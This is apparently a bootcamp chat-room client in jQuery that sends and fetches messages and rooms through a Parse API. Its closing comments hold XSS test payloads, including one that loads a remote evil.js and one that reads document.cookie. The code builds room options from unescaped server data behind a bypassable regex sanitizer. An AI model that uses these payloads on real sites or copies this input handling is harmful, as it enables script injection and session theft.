var app = {
  roomStore: {},
  currentRoom: {},
  friendList: {},
  init: () => {
    $(document).ready(function() {
      let windowUser = window.location.search.split('=')[1];
      $('.spinner').hide();
      $('#mySelect').change(function() {
        var selectedValue = $('#mySelect').val();
        if (selectedValue === 'New Room') {
          $('.window-popup').show(300);
        } else {
          $('#mySelect option[value="' + selectedValue + '"]').prop('selected', true);
          app.currentRoom[0] = selectedValue;
          app.fetch('{"roomname":"' + selectedValue + '"}');
        }
      });
      $('#button-popup-close').click(function() {
        $('.window-popup').hide(300);
      });

      $('.addnewRoom').click(function() {
        var input = sanitize($('.roomInput').val());
        if (input === '') {
          alert('Please type something');
        } else {
          $('#mySelect').append('<option value="' + input + '">' + input + '</option>');
          $('#mySelect option[value=\'New Room\']').remove();
          $('#mySelect option[value="' + input + '"]').prop('selected', true);
          $('#mySelect').append('<option value="New Room">New Room</option>');
          $('.window-popup').hide(300);

          var newRoomMessage = {
            username: windowUser,
            text: 'NEW ROOM CREATED',
            roomname: input
          };

          app.send(newRoomMessage);
          app.currentRoom[0] = input;
          app.fetch('{"roomname":"' + input + '"}');
        }
      });
      $('.box').click(function() {
        var input = $('.messageText').val();
        var accessRoom = $('#mySelect').val();
        if (input === '') {
          alert('Please type message');
        } else {
          $('.spinner').show();
          setTimeout(function() {
            $('.spinner').hide();
          }, 900);

          let cleanInput = sanitize(input);

          var message = {
            username: windowUser,
            text: cleanInput,
            roomname: accessRoom
          };
          app.send(message);
          $('.messageText').val('');
          app.fetch('{"roomname":"' + accessRoom + '"}');
        }
      });
      $('.spinner').show();
      setTimeout(function() {
        $('.spinner').hide();
      }, 900);
      app.currentRoom[0] = 'lobby';
      app.fetch('{"roomname":"' + app.currentRoom[0] + '"}');
      setInterval(() => {
        app.fetch('{"roomname":"' + app.currentRoom[0] + '"}');
      }, 3000);
    });

  },
  send: (element) => {
    $.ajax({
      type: 'POST',
      url: 'http://parse.hrr.hackreactor.com/chatterbox/classes/messages',
      data: JSON.stringify(element),
      contentType: 'application/json',
      success: function(data) {},
      error: function(data) {
        console.error('chatterbox: Failed to send message', data);
      }
    });
  },
  fetch: (...things) => {
    let urlAPI = 'http://parse.hrr.hackreactor.com/chatterbox/classes/messages?';
    let dataObj = { order: '-createdAt' };
    if (things.length > 0) {
      dataObj.where = things[0];
    }
    $.ajax({
      url: urlAPI,
      method: 'GET',
      data: dataObj,
      dataType: 'json'
    }).then(function(data) {
      app.renderMessage(data.results);
      app.addToRoomObject(data.results);
    });
  },

  clearMessages: () => {
    $('#chats').html('');
  },
  renderMessage: (message) => {
    var mainArr = message;
    $('#chats').html('');
    mainArr.forEach(function(post) {

      var text = sanitize(post.text);
      var user = sanitize(post.username || 'anonymous');

      let $messageBox = $('<div class="messageBox"></div>');

      let $username = $('<a href=# class="messageUserName"></a>');
      $username.html(user.replace(/%20/g, ' '));

      if (app.friendList[user] !== undefined && app.friendList[user] !== 'anonymous') {
        $username.addClass('befriended');
      }

      let $messageText = $('<div class="messageUserText"></div>');
      $messageText.html(text);
      $username.appendTo($messageBox);
      $messageText.appendTo($messageBox);
      $messageBox.appendTo('#chats');
    });

  },
  addToRoomObject: (rooms) => {
    var mainArr = rooms;

    mainArr.forEach(function(room) {
      let roomChoice = room.roomname;

      if (app.roomStore[roomChoice] === undefined && roomChoice !== undefined && roomChoice !== '') {
        app.roomStore[roomChoice] = true;
      }
    });

    app.renderRoom();
  },
  renderRoom: () => {

    $('#mySelect').html('');


    for (var key in app.roomStore) {
      let $addNewRoomItem = $('<option value="' + key + '">' + key + '</option>');
      $addNewRoomItem.appendTo('#mySelect');
    }
    let $addNewRoom = $('<option class="newRoom" value="New Room">New Room</option>');
    $addNewRoom.appendTo('#mySelect');
    if (app.currentRoom[0] !== undefined) {
      $('#mySelect option[value="' + app.currentRoom[0] + '"]').prop('selected', true);
    } else {
      $('#mySelect option[value="lobby"]').prop('selected', true);
    }
  }
};

$(document).on('click', '.messageUserName', function() {
  var user = $(this).text();
  app.friendList[user] = user;
  app.fetch('{"username":"' + user + '"}');
});

let sanitize = function(input) {
  if (input !== undefined) {
    var output = input.replace(/<script[^>]*?>.*?<\/script>/gi, '').
      replace(/<[\/\!]*?[^<>]*?>/gi, '').
      replace(/<style[^>]*?>.*?<\/style>/gi, '').
      replace(/<![\s\S]*?--[ \t\n\r]*>/gi, '');
    return output;
  }
  return 'empty';
};

/*<img src=1 onerror=\"s=document.createElement(\'script\');s.src=\'//xss-doc.appspot.com/static/evil.js\';document.body.appendChild(s);\"
// <img src=x onerror="alert(document.cookie);"*/

// "<script>let x=document.getElementsByTagName('body');x[0].style.background='repeating-linear-gradient(45deg, pink 0%, pink 20%, yellow 0%, yellow 50%) 0 / 55px 55px';</script>"